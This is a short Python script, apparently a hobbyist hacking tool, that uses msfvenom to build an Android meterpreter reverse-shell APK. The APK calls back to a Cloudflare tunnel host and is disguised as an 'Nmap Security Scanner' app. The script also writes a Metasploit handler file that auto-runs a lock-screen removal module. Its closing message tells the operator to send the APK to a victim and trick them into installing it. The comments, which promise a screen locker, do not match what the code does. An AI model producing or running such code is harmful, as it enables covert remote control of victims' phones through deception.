import os

def screen_hijacker():
    print("="*40)
    print("   MEHDI BHAI N-MAP SCREEN LOCKER   ")
    print("="*40)
    
    # 1. Payload settings (System buttons disable karne ke liye)
    # Is mein 'LockTaskMode' use hota hai jo screen ko pin kar deta hai
    app_name = "Nmap_Security_Scanner"
    
    # 2. Building the Hijack Command
    # Ye command APK banayegi jo open hote hi N-map image dikhayegi
    print("[+] Creating Hijack APK with N-map Logo...")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST=derby-attempted-biz-instead.trycloudflare.com LPORT=443 -o {app_name}.apk")
    
    # 3. Automation for Button Lock
    with open("lock_buttons.rc", "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write("set payload android/meterpreter/reverse_tcp\n")
        f.write("set LHOST 127.0.0.1\n")
        f.write("set LPORT 4444\n")
        # Ye command screen ko lock kar degi
        f.write("set InitialAutoRunScript 'post/android/manage/remove_lock_screen'\n") 
        f.write("exploit -j -z\n")

    print(f"[!] Done! '{app_name}.apk' ban gayi hai.")
    print("[!] Isay victim ko bhej kar 'N-map Security' bol kar install karwayein.")

screen_hijacker()
